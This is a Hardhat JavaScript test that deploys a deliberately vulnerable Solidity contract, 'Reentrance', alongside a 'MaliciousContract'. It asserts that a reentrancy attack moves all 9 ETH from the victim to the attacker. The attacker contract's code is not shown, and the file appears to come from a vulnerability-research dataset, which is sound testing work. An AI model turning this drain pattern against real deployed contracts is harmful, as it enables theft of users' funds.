const { expect } = require("chai");
const { ethers } = require("hardhat");
describe("Reentrancy Attack for reentrance.sol", function () {  
    let PrivateBank;
    let victim;
    let MaliciousContract;
    let hacker;
    let Log;
    let log;

    beforeEach(async function () {
        // Deploy Log contract

        // Deploy PrivateBank contract with Log address
        PrivateBank = await ethers.getContractFactory("contracts/dataset/reentrancy/reentrance.sol:Reentrance");
        victim = await PrivateBank.deploy();
        await victim.waitForDeployment();
        //await victim.setLog(log.target); // Set Log address after deployment

        // Deploy MaliciousContract with PrivateBank address
        MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/reentrance_attack.sol:MaliciousContract");
        hacker = await MaliciousContract.deploy(victim.target);
        
    });

    it("should successfully drain funds through reentrancy attack", async function () {
        // Initial deposit to victim contract
        await victim.donate( victim.target, {value: ethers.parseEther("5") });

        const victimInitialBalance = await ethers.provider.getBalance(victim.target);
        expect(victimInitialBalance).to.equal(ethers.parseEther("5")); 


        // Initial deposit from hacker on victim contract
        await hacker.deposit({value:  ethers.parseEther("4")});

        const victimBalanceAfterDeposit = await ethers.provider.getBalance(victim.target);
        expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("9")); 

        // Set hacker balance to 0
        await network.provider.send("hardhat_setBalance", [
            hacker.target,
            "0x0",
          ]);
        let hackerBalance = await ethers.provider.getBalance(hacker.target);
        expect(hackerBalance).to.equal(0);


        // Perform reentrancy attack through MaliciousContract
        await hacker.attack(ethers.parseEther("1"));
        
        // Check balances after attack
        const victimBalance = await ethers.provider.getBalance(victim.target);
        hackerBalance = await ethers.provider.getBalance(hacker.target);

        // Verify the attack was successful
        
        // victim has a drained account
        expect(victimBalance).to.equal(ethers.parseEther("0")); 

        // 5 original balance + 4 from hacker initial deposit 
        expect(hackerBalance).to.equal(ethers.parseEther("9"));
        
    });
    });
  